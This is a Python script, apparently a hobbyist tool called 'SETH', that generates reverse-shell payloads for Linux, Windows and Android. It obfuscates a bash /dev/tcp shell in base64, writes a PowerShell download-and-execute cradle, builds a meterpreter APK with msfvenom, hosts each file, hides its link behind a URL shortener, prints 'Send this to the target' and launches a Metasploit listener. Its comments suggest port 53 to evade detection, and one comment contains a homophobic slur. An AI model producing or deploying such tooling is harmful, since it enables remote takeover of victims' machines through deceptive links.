import os
import subprocess
import time
import base64
import random
import string
import requests

# config
LHOST = "myipaddress"
LPORT = "4444"  # i might use 53 for real world scenarios,you can use 53 since people forget to check dns
HTTP_PORT = "8080"
OBFUSCATE = True # force if you don't care about obfuscation
SHORTEN_LINKS = True # also false if you don't want to shorten your link

# generate random filename
def random_name(extension):
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + extension

# obfuscation
def obfuscate_payload(payload):
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"

# start python http server...i will bind 0.0.0.0 if this fails later
def start_http_server():
    print("[*] Starting HTTP server...")
    os.system(f"nohup python3 -m http.server {HTTP_PORT} > /dev/null 2>&1 &")
    time.sleep(2)

# shorten URL
def shorten_url(url):
    if SHORTEN_LINKS:
        response = requests.get(f"http://tinyurl.com/api-create.php?url={url}")
        return response.text
    return url

# generating a linux payload
def generate_linux_payload():
    print("[*] Generating Linux payload...")
    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    if OBFUSCATE:
        shell_cmd = obfuscate_payload(shell_cmd)
    
    filename = random_name(".sh")
    with open(filename,"w") as f:
        f.write("#!/bin/bash\n")
        f.write(shell_cmd)
    
    os.system(f"chmod +x {filename}")
    print(f"[+] Linux payload created: {filename}")
    
    # host it using the python server
    start_http_server()
    link = f"http://{LHOST}:{HTTP_PORT}/{filename}"
    short_link = shorten_url(link)
    print(f"[*] Send this to the target: {short_link}")
    
# windows payload
def generate_windows_payload():
    print("[*] Generating Windows payload...")
    shell_cmd = f"powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}:{HTTP_PORT}/shell.ps1')\""
    if OBFUSCATE:
        shell_cmd = obfuscate_payload(shell_cmd)
        
    filename = random_name(".ps1")
    with open(filename,"w") as f:
        f.write(f"$client = New-Object System.Net.WebClient\n")
        f.write(f"$client.DownloadString('http://{LHOST}:{HTTP_PORT}/{filename}') | Invoke-Expression\n")
        
    os.system(f"chmod +x {filename}")
    print(f"[+] Windows payload created: {filename}")
    
    # hosting
    start_http_server()
    link = f"http://{LHOST}:{HTTP_PORT}/{filename}"
    short_link = shorten_url(link)
    print(f"[*] Send this to the target: {short_link}")
    
# android payload
def generate_android_payload():
    print("[*] Generating Android payload...")
    apk_name = random_name(".apk")
    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {apk_name}")
    print(f"[+] Android payload created: {apk_name}")
    
    # hosting
    start_http_server()
    link = f"http://{LHOST}:{HTTP_PORT}/{apk_name}"
    short_link = shorten_url(link)
    print(f"[*] Send this to the target: {short_link}")

# start metasploit listener
def start_metasploit():
    print("[*] Starting Metasploit listener...")
    msf_script = f"""
    use exploit/multi/handler
    set payload linux/x64/meterpreter/reverse_tcp
    set LHOST {LHOST}
    set LPORT {LPORT}
    exploit -j
    """
    with open("msf.rc","w") as f:
        f.write(msf_script)
    os.system("msfconsole -q -r msf.rc")

# main..i will think of a better name seth is gayish
def main():
    print("""
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║
    ███████╗█████╗     ██║   ███████║
    ╚════██║██╔══╝     ██║   ██╔══██║
    ███████║███████╗   ██║   ██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    
    🔥 quicker way to generate that rev shell 🔥
    """)
    
    print("[1] Linux Reverse Shell")
    print("[2] Windows Reverse Shell")
    print("[3] Android Reverse Shell")
    print("[4] Start Metasploit Listener")
    print("[0] Exit")
    
    choice = input("Select an option: ")
    if choice == "1":
        generate_linux_payload()
    elif choice == "2":
        generate_windows_payload()
    elif choice == "3":
        generate_android_payload()
    elif choice == "4":
        start_metasploit()
    elif choice == "0":
        exit()
    else:
        print("[!] Invalid option.")
        main()

if __name__ == "__main__":
    main()

